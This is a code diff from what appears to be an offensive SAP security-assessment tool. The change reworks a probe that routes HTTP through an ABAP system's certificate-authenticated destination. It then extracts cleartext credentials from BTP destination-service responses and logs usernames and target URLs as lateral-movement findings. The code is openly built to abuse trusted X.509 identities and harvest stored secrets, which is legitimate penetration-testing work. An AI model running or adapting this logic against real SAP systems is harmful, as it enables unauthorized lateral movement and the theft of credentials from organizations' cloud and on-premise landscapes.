@@ -8148,71 +8148,85 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"use Test RFC Destination for basic-auth")})
 
         def _run():
+            # Same pattern as the Retrieve-RFCs auto-probe: plain
+            # GET / regardless of hostname, then opportunistically
+            # parse the body as BTP destination-service JSON when
+            # the shape suggests it.  Blindly calling
+            # ``/destination-configuration/v1/subaccountDestinations``
+            # on the wrong host (e.g. api.eu1 landing page) returned
+            # HTML and made the manual button useless for the exact
+            # destinations that succeed in auto-probe.
+            import json as _json
             from sap_http_via_dest import (
                 call_via_destination,
-                enumerate_btp_subaccount_destinations,
+                flag_btp_cleartext,
                 HttpViaDestError)
             creds = node.best_credentials()
-            is_btp = ("hana.ondemand.com" in (conn.http_url or ""))
             print(f"[*] {sid}: cert-dest probe via {dest_name} "
                   f"(PSE {conn.http_cert_pse or '?'}, "
                   f"target {conn.http_url or '?'})")
             try:
-                if is_btp:
-                    r = enumerate_btp_subaccount_destinations(
-                        node, dest_name, creds=creds)
-                    if not r["ok"]:
-                        print(f"[-] {sid}: {dest_name}: "
-                              f"BTP enum failed — {r.get('error', '?')}")
-                        return
-                    print(f"[+] {sid}: {dest_name}: BTP subaccount "
-                          f"returned {r['count']} destination(s), "
-                          f"{len(r['cleartext'])} carry cleartext "
-                          f"secrets")
-                    for hit in r["cleartext"]:
-                        print(f"[!] {sid}: cleartext "
-                              f"{hit['field']} in BTP dest "
-                              f"{hit['name']!r} → "
-                              f"{hit['target_url']} (user: "
-                              f"{hit['user']!r})")
-                    if r["cleartext"]:
-                        emit_finding(
-                            "CRITICAL", sid,
-                            f"Kernel-proxied cert-auth via "
-                            f"{dest_name} extracted "
-                            f"{len(r['cleartext'])} cleartext "
-                            f"on-prem credential(s) from the BTP "
-                            f"subaccount destination service — "
-                            f"lateral move back to on-prem targets.",
-                            attack_capability="lateral.btp_cert_proxy",
-                        )
-                    else:
-                        emit_finding(
-                            "HIGH", sid,
-                            f"Kernel-proxied cert-auth via "
-                            f"{dest_name} reached BTP subaccount "
-                            f"destination service ({r['count']} "
-                            f"destinations returned) — the source "
-                            f"ABAP's X.509 identity works for BTP "
-                            f"management APIs.")
-                else:
-                    r = call_via_destination(
-                        node, dest_name, method="GET", path="/",
-                        creds=creds)
-                    if r["ok"]:
-                        print(f"[+] {sid}: {dest_name}: HTTP "
-                              f"{r['status']} {r.get('reason', '')} "
-                              f"({len(r['body'])} B body)")
-                        emit_finding(
-                            "HIGH", sid,
-                            f"Kernel-proxied cert-auth via "
-                            f"{dest_name} → {conn.http_url}: "
-                            f"HTTP {r['status']}.  Source ABAP's "
-                            f"X.509 identity (PSE "
-                            f"{conn.http_cert_pse or '?'}) works.")
-                    else:
-                        print(f"[-] {sid}: {dest_name}: "
-                              f"{r.get('error', '?')}")
+                r = call_via_destination(
+                    node, dest_name, method="GET", path="/",
+                    creds=creds)
+                if not r["ok"]:
+                    print(f"[-] {sid}: {dest_name}: "
+                          f"{r.get('error', '?')}")
+                    return
+                print(f"[+] {sid}: {dest_name}: HTTP {r['status']} "
+                      f"{r.get('reason', '')} "
+                      f"({len(r['body'])} B body)")
+                emit_finding(
+                    "HIGH", sid,
+                    f"Kernel-proxied cert-auth via {dest_name} → "
+                    f"{conn.http_url}: HTTP {r['status']}.  Source "
+                    f"ABAP's X.509 identity (PSE "
+                    f"{conn.http_cert_pse or '?'}) is trusted by the "
+                    f"target — kernel-proxied HTTP lateral-move "
+                    f"channel confirmed.")
+                # Opportunistic BTP-destination-service parse.  Fires
+                # only when host is *.hana.ondemand.com AND status is
+                # 2xx AND body looks JSON-shaped.  Silent otherwise
+                # (no more "not valid JSON" errors on plain landing
+                # pages).
+                body = (r.get("body") or "").strip()
+                is_btp = "hana.ondemand.com" in (conn.http_url or "")
+                if (is_btp and 200 <= r["status"] < 300
+                        and body.startswith(("[", "{"))):
+                    try:
+                        parsed = _json.loads(body)
+                        dests = (parsed if isinstance(parsed, list)
+                                  else parsed.get("destinations")
+                                    if isinstance(parsed, dict)
+                                    else None)
+                        if isinstance(dests, list) and dests:
+                            cleartext = flag_btp_cleartext(dests)
+                            print(f"[+] {sid}: {dest_name}: body "
+                                  f"looks like BTP destination "
+                                  f"service — {len(dests)} "
+                                  f"destination(s), {len(cleartext)}"
+                                  f" with cleartext secrets")
+                            for hit in cleartext:
+                                print(f"[!] {sid}: cleartext "
+                                      f"{hit['field']} in BTP dest "
+                                      f"{hit['name']!r} → "
+                                      f"{hit['target_url']} "
+                                      f"(user: {hit['user']!r})")
+                            if cleartext:
+                                emit_finding(
+                                    "CRITICAL", sid,
+                                    f"Kernel-proxied cert-auth via "
+                                    f"{dest_name} extracted "
+                                    f"{len(cleartext)} cleartext "
+                                    f"on-prem credential(s) from BTP "
+                                    f"subaccount destinations — "
+                                    f"lateral move back to on-prem.",
+                                    attack_capability=(
+                                        "lateral.btp_cert_proxy"))
+                    except Exception:
+                        # Not JSON / not the shape we expected —
+                        # silent skip (not a bug).
+                        pass
             except HttpViaDestError as e:
                 print(f"[-] {sid}: cert-dest probe rejected: {e}")
 
